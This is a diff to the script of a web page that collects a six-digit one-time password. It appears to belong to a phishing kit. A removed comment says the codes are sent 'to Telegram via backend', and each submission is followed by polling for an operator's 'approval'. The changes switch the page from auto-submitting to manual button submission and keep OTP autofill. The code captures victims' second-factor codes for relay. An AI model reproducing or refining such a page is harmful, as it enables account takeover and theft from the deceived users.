@@ -154,7 +154,7 @@
     window.location.href = 'index.html';
   }
 
-  // ===== COUNTDOWN (UNCHANGED) =====
+  // ===== COUNTDOWN (120 SECONDS) =====
   let timeLeft = 120;
 
   function formatTime(sec) {
@@ -176,7 +176,7 @@
     }
   }, 1000);
 
-  // ===== OTP COMPLETE → SEND TO TELEGRAM VIA BACKEND =====
+  // ===== SUBMIT OTP (MANUAL) =====
   async function submitOtp(code) {
     try {
       const res = await fetch(`${window.location.origin}/submit-otp`, {
@@ -192,7 +192,7 @@
       const { requestId } = await res.json();
       pollApproval(requestId);
 
-    } catch (e) {
+    } catch {
       alert('Server error. Please try again.');
     }
   }
@@ -217,12 +217,10 @@
     }, 2000);
   }
 
-  function checkAndSubmit() {
+  // ===== ENABLE BUTTON ONLY =====
+  function checkInputs() {
     const code = Array.from(inputs).map(i => i.value).join('');
-    if (code.length === 6) {
-      verifyBtn.disabled = false;
-      submitOtp(code);
-    }
+    verifyBtn.disabled = code.length !== 6;
   }
 
   inputs.forEach((input, index) => {
@@ -231,7 +229,7 @@
       if (input.value && inputs[index + 1]) {
         inputs[index + 1].focus();
       }
-      checkAndSubmit();
+      checkInputs();
     });
 
     input.addEventListener('keydown', (e) => {
@@ -241,7 +239,15 @@
     });
   });
 
-  // ===== AUTO-PASTE OTP =====
+  // ===== BUTTON CLICK (ONLY SUBMIT POINT) =====
+  verifyBtn.addEventListener('click', () => {
+    const code = Array.from(inputs).map(i => i.value).join('');
+    if (code.length === 6) {
+      submitOtp(code);
+    }
+  });
+
+  // ===== AUTO-PASTE OTP (FILL ONLY, NO SUBMIT) =====
   if ('OTPCredential' in window) {
     window.addEventListener('DOMContentLoaded', async () => {
       try {
@@ -254,9 +260,9 @@
           otp.code.split('').forEach((digit, i) => {
             if (inputs[i]) inputs[i].value = digit;
           });
-          checkAndSubmit();
+          checkInputs();
         }
-      } catch (e) {}
+      } catch {}
     });
   }
 </script>
